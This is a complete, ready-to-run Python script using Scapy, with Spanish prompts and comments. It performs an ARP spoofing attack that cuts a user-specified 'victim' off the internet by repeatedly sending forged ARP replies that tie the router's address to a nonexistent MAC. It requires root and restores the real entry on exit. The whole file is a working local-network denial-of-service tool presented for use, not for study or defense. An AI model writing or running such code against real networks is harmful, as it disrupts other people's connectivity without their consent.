from scapy.all import ARP, send, getmacbyip
import time
import sys
import re
import os  # Importar el módulo os para verificar permisos

def validate_ip(ip):
    """Valida que la dirección IP tenga un formato correcto."""
    pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    return pattern.match(ip) is not None

def get_user_input():
    """Obtiene y valida las direcciones IP del router y la víctima."""
    while True:
        router_ip = input("Ingrese la IP del router: ").strip()
        if validate_ip(router_ip):
            break
        print("[X] IP del router no válida. Inténtelo de nuevo.")

    while True:
        victima_ip = input("Ingrese la IP de la víctima: ").strip()
        if validate_ip(victima_ip):
            break
        print("[X] IP de la víctima no válida. Inténtelo de nuevo.")

    return router_ip, victima_ip

def arp_spoof(router_ip, victima_ip):
    """Realiza el ataque de ARP spoofing para bloquear la conexión de la víctima."""
    fake_mac = "00:00:00:00:00:00"  # MAC inexistente para bloquear internet
    try:
        router_mac = getmacbyip(router_ip)  # Obtiene la MAC real del router
        if not router_mac:
            print("[X] No se pudo obtener la MAC del router. Verifica la IP.")
            return

        print(f"[+] Bloqueando a {victima_ip} (router: {router_ip}, MAC real: {router_mac})")

        try:
            while True:
                # Enviar ARP falso con MAC inexistente
                packet = ARP(op=2, pdst=victima_ip, psrc=router_ip, hwsrc=fake_mac)
                send(packet, verbose=False)
                time.sleep(1)  # Reducir el tiempo de espera para mayor efectividad
        except KeyboardInterrupt:
            print("\n[!] Ataque detenido. Restaurando conexión...")
    except Exception as e:
        print(f"[X] Error inesperado: {e}")
    finally:
        # Restaurar la tabla ARP de la víctima con la MAC real del router
        restore_packet = ARP(op=2, pdst=victima_ip, psrc=router_ip, hwsrc=router_mac)
        send(restore_packet, count=5, verbose=False)  # Envía varias veces para asegurar la recuperación
        print("[✔] Conexión restaurada con éxito.")

if __name__ == "__main__":
    # Verificar permisos de superusuario
    if not sys.platform.startswith('linux'):
        print("[X] Este script solo es compatible con sistemas Linux.")
        sys.exit(1)
    if not os.geteuid() == 0:  # Verificar si el usuario es root
        print("[X] Este script debe ejecutarse como superusuario (root).")
        sys.exit(1)

    router_ip, victima_ip = get_user_input()
    arp_spoof(router_ip, victima_ip)